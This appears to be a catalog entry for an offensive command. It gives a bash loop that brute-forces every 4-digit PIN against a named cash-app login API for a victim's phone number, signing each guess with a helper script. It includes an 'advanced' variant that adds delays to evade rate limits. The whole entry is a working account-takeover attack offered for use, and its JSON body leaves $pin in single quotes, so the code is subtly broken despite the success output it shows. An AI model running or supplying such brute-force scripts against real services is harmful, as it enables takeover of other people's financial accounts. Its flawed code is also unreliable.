---
id: cmd-curl-pin-bruteforce-001
name: curl-pin-bruteforce
type: command
executor: bash
data: >-
  for pin in {0000..9999}; do curl -X POST
  https://api.romit.io/v0/cash/auth/login -H "Authorization: Bearer $(node
  calSignature.js $pin)" -d '{"phone":"+1VICTIM_PHONE","pin":"$pin"}' | grep -q
  "success" && echo "PIN: $pin" && break; done
output: 'PIN: 1234'
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.188Z'
platforms:
  - Linux
  - macOS
tags:
  - brute-force
  - api-bruteforce
verified: false
validated: true
submitted: true
---

# curl-pin-bruteforce

## Command

```bash
for pin in {0000..9999}; do curl -X POST https://api.romit.io/v0/cash/auth/login -H "Authorization: Bearer $(node calSignature.js $pin)" -d '{"phone":"+1VICTIM_PHONE","pin":"$pin"}' | grep -q "success" && echo "PIN: $pin" && break; done
```

## Description

This bash loop uses curl to brute-force the 4-digit PIN by iterating guesses, generating signatures via calSignature.js, and checking for success in responses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for pin in {0000..9999}` | Loop over PIN values | Yes |
| `$(node calSignature.js $pin)` | Dynamic signature generation | Yes |
| `-d '{"phone":"+1VICTIM_PHONE","pin":"$pin"}'` | Payload with phone and current PIN | Yes |
| `grep -q "success"` | Quiet check for success indicator | Yes |

## Examples

### Basic Usage

```bash
for pin in {0000..9999}; do curl ... ; done
```

### Advanced Usage

Add delay to evade potential soft limits:

```bash
for pin in {0000..9999}; do curl ... ; sleep 0.1; done
```

## Expected Output

Echoes the correct PIN on match, e.g., "PIN: 1234", and breaks the loop.

## Related

- [[Related Procedure: Brute-Force-PIN-Using-Client-Side-Signature-Generation]]
